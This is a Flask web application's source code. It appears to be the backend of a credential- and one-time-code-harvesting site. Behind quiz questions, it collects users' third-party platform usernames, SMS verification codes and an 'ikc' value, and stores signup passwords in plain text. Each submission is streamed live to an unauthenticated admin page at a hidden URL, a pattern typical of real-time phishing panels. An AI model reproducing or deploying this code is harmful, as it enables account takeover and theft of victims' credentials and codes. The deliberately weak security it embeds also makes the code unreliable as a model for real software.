import os, json
from datetime import datetime, timedelta
from flask import Flask, render_template, request, redirect, url_for, session, jsonify, flash
from flask_sqlalchemy import SQLAlchemy
from flask_migrate import Migrate
from flask_socketio import SocketIO, emit
# ----------------------------------------------------------------------------
app = Flask(__name__, static_folder='static', static_url_path='/static')
app.secret_key = os.environ.get('FLASK_SECRET_KEY','dev-secret-key-change-me')
DATABASE_URL = os.environ.get('DATABASE_URL', 'sqlite:///db.sqlite3')
app.config['SQLALCHEMY_DATABASE_URI'] = DATABASE_URL
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)
migrate = Migrate(app, db)
socketio = SocketIO(app, cors_allowed_origins='*', async_mode='eventlet')
# ----------------------------------------------------------------------------
SECRET_ADMIN_PATH = os.environ.get('SECRET_ADMIN_PATH','secret-admin-9f4b3d')
SESSION_TIMEOUT_MINUTES = int(os.environ.get('SESSION_TIMEOUT_MINUTES','60'))
# ----------------------------------------------------------------------------
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(150), unique=True, nullable=True)
    contact = db.Column(db.String(255), unique=True, nullable=False)
    password = db.Column(db.String(255), nullable=False)  # plain-text (as requested)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    last_active = db.Column(db.DateTime, default=datetime.utcnow)

class Submission(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    kind = db.Column(db.String(50))
    user_id = db.Column(db.Integer, nullable=True)
    payload = db.Column(db.Text)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

with app.app_context():
    db.create_all()

# helpers
def current_user():
    uid = session.get('user_id')
    if not uid:
        return None
    return User.query.get(uid)

def require_login():
    if 'user_id' not in session:
        return False
    last = session.get('last_active')
    if last:
        try:
            last_dt = datetime.fromisoformat(last)
            if datetime.utcnow() - last_dt > timedelta(minutes=SESSION_TIMEOUT_MINUTES):
                session.clear()
                return False
        except Exception:
            session.clear()
            return False
    session['last_active'] = datetime.utcnow().isoformat()
    try:
        u = User.query.get(session['user_id'])
        if u:
            u.last_active = datetime.utcnow()
            db.session.commit()
    except Exception:
        db.session.rollback()
    return True

def emit_submission(sub):
    try:
        payload = {
            'id': sub.id,
            'kind': sub.kind,
            'user_id': sub.user_id,
            'payload': json.loads(sub.payload) if sub.payload else sub.payload,
            'created_at': sub.created_at.isoformat()
        }
    except Exception:
        payload = {'id': sub.id, 'kind': sub.kind, 'user_id': sub.user_id, 'payload': sub.payload, 'created_at': sub.created_at.isoformat()}
    socketio.emit('new_submission', payload, namespace='/admin')

# routes
@app.route('/')
def public_home():
    user = current_user()
    return render_template('home_public.html', user=user)

@app.route('/signup', methods=['GET','POST'])
def signup():
    if request.method == 'POST':
        username = request.form.get('username','').strip() or None
        contact = request.form.get('contact','').strip()
        password = request.form.get('password','').strip()
        if not contact or not password:
            flash('Provide contact and password.','error')
            return redirect(url_for('signup'))
        if User.query.filter((User.contact==contact) | (User.username==username)).first():
            flash('Username or contact already exists.','error')
            return redirect(url_for('signup'))
        u = User(username=username, contact=contact, password=password)
        db.session.add(u); db.session.commit()
        s = Submission(kind='signup', user_id=u.id, payload=json.dumps({'username':username,'contact':contact,'password':password}))
        db.session.add(s); db.session.commit()
        emit_submission(s)
        session['user_id'] = u.id
        session['last_active'] = datetime.utcnow().isoformat()
        flash('Account created and logged in.','success')
        return redirect(url_for('dashboard'))
    return render_template('signup.html')

@app.route('/login', methods=['GET','POST'])
def login():
    if request.method == 'POST':
        ident = request.form.get('username','').strip()
        password = request.form.get('password','')
        user = None
        if ident:
            user = User.query.filter_by(username=ident, password=password).first()
            if not user:
                user = User.query.filter_by(contact=ident, password=password).first()
        if user:
            session['user_id'] = user.id
            session['last_active'] = datetime.utcnow().isoformat()
            flash('Logged in.','success')
            return redirect(url_for('dashboard'))
        flash('Invalid credentials.','error')
        return redirect(url_for('login'))
    return render_template('login.html')

@app.route('/logout')
def logout():
    session.clear()
    flash('Logged out.','success')
    return redirect(url_for('public_home'))

@app.route('/dashboard')
def dashboard():
    if not require_login():
        return redirect(url_for('login'))
    user = current_user()
    return render_template('home_private.html', user=user)

# Section1
@app.route('/section1/question', methods=['GET','POST'])
def section1_question():
    if not require_login(): return redirect(url_for('login'))
    if request.method == 'POST':
        ans = (request.form.get('answer','') or '').strip().lower()
        ok = ans in ('24','24 months','24months')
        return jsonify({'ok': bool(ok)})
    return render_template('section1_question.html')

@app.route('/section1/details', methods=['GET','POST'])
def section1_details():
    if not require_login(): return redirect(url_for('login'))
    u = current_user()
    if request.method == 'POST':
        platform = request.form.get('platform','').strip()
        uname = request.form.get('uname','').strip()
        desired = request.form.get('desired','').strip()
        payload = {'platform':platform,'username':uname,'desired':desired}
        s = Submission(kind='section1_details', user_id=u.id, payload=json.dumps(payload))
        db.session.add(s); db.session.commit()
        emit_submission(s)
        return jsonify({'status':'ok'})
    return render_template('section1_details_page.html')

@app.route('/section1/verify_code', methods=['POST'])
def section1_verify_code():
    if not require_login(): return jsonify({'ok':False,'error':'login required'}),403
    u = current_user()
    code = request.form.get('code','').strip()
    payload = {'code':code}
    s = Submission(kind='section1_sms', user_id=u.id, payload=json.dumps(payload))
    db.session.add(s); db.session.commit()
    emit_submission(s)
    return jsonify({'ok': True})

# Section2
@app.route('/section2/question', methods=['GET','POST'])
def section2_question():
    if not require_login(): return redirect(url_for('login'))
    if request.method == 'POST':
        ans = (request.form.get('answer','') or '').strip()
        ok = ans in ('6','17')
        return jsonify({'ok': bool(ok)})
    return render_template('section2_question.html')

@app.route('/section2/details', methods=['GET','POST'])
def section2_details():
    if not require_login(): return redirect(url_for('login'))
    u = current_user()
    if request.method == 'POST':
        platform = request.form.get('platform','').strip()
        uname = request.form.get('uname','').strip()
        desired = request.form.get('desired','').strip()
        payload = {'platform':platform,'username':uname,'desired':desired}
        s = Submission(kind='section2_details', user_id=u.id, payload=json.dumps(payload))
        db.session.add(s); db.session.commit()
        emit_submission(s)
        return jsonify({'status':'ok'})
    return render_template('section2_details_page.html')

@app.route('/section2/verify_code', methods=['POST'])
def section2_verify_code():
    if not require_login(): return jsonify({'ok':False,'error':'login required'}),403
    u = current_user()
    code = request.form.get('code','').strip()
    payload = {'code':code}
    s = Submission(kind='section2_sms', user_id=u.id, payload=json.dumps(payload))
    db.session.add(s); db.session.commit()
    emit_submission(s)
    return jsonify({'ok': True})

# Section3
@app.route('/section3')
def section3():
    if not require_login(): return redirect(url_for('login'))
    return render_template('section3.html')

# Section4 IKC
@app.route('/section4', methods=['GET','POST'])
def section4():
    if not require_login(): return redirect(url_for('login'))
    u = current_user()
    if request.method == 'POST':
        ikc = request.form.get('ikc','').strip()
        payload = {'ikc':ikc}
        s = Submission(kind='ikc', user_id=u.id, payload=json.dumps(payload))
        db.session.add(s); db.session.commit()
        emit_submission(s)
        return jsonify({'status':'ok'})
    return render_template('section4.html')

@app.route('/_keepalive', methods=['POST'])
def keepalive():
    uid = session.get('user_id')
    session['last_active'] = datetime.utcnow().isoformat()
    if uid:
        try:
            u = User.query.get(uid)
            if u:
                u.last_active = datetime.utcnow()
                db.session.commit()
        except Exception:
            db.session.rollback()
    return {'ok': True}, 200

@app.route(f'/{SECRET_ADMIN_PATH}')
def admin_page():
    users = User.query.order_by(User.id.asc()).all()
    subs = Submission.query.order_by(Submission.created_at.desc()).all()
    return render_template('admin.html', users=users, subs=subs, secret_path=SECRET_ADMIN_PATH)

@socketio.on('join', namespace='/admin')
def on_join(data):
    emit('joined', {'status':'ok'})

if __name__ == '__main__':
    port = int(os.environ.get('PORT','10000'))
    socketio.run(app, host='0.0.0.0', port=port)
